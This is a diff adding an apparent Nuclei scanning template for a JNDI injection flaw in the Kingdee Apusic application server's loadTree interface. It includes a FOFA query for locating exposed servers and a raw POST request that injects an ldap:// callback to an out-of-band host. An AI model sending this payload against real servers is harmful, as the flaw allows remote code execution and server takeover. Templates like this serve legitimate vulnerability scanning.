@@ -1,0 +1,28 @@
+id: kingdee-apusic-loadtree-jndi
+info:
+  name: 金蝶Apusic loadTree接口JNDI注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="欢迎使用Apusic应用服务器"
+        金蝶Apusic应用服务器的loadTree接口存在JNDI注入漏洞，攻击者可通过构造恶意请求实现远程代码执行，进而获取服务器完全控制权限。
+  tags: 金蝶Apusic
+http:
+- raw:
+  - |
+    POST /admin//protect/jndi/loadTree HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+
+    jndiName=ldap://{{interactsh-url}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
